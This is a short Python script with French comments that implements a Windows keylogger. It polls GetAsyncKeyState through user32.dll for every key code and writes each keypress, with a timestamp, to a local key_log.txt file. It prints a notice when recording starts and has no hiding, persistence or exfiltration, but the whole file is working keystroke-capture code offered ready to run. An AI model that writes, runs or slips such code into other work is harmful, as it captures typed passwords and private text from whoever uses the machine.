import ctypes
import logging
import os
import time

# --- CONFIGURATION ---
# Le fichier où les touches seront enregistrées
log_file = "key_log.txt"

print(f"L'enregistrement a commencé... Fermez la fenêtre pour arrêter.")
print(f"Les touches sont sauvegardées dans : {os.path.abspath(log_file)}")

# Configuration du logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# Chargement de la bibliothèque utilisateur de Windows (User32.dll)
user32 = ctypes.windll.user32

def start_logging():
    """Utilise l'API Windows pour détecter les pressions de touches sans bibliothèque externe."""
    last_keys = [False] * 256
    
    while True:
        # On itère sur les codes de touches virtuels (0 à 255)
        for i in range(1, 256):
            # GetAsyncKeyState vérifie si la touche est pressée au moment de l'appel
            state = user32.GetAsyncKeyState(i)
            
            # Si le bit de poids fort est à 1, la touche est pressée
            if state & 0x8000:
                if not last_keys[i]:
                    key_code = i
                    # Traduction basique des codes communs
                    if key_code == 0x0D:
                        logging.info("Touche spéciale : Key.enter")
                    elif key_code == 0x20:
                        logging.info("Touche spéciale : Key.space")
                    elif key_code == 0x08:
                        logging.info("Touche spéciale : Key.backspace")
                    elif 32 < key_code < 127:
                        logging.info(f"Touche pressée : {chr(key_code)}")
                    else:
                        logging.info(f"Touche spéciale : Code_{key_code}")
                    
                    last_keys[i] = True
            else:
                last_keys[i] = False
        
        # Petite pause pour ne pas surcharger le processeur
        time.sleep(0.01)

if __name__ == "__main__":
    try:
        start_logging()
    except KeyboardInterrupt:
        print("\nArrêt de l'enregistrement.")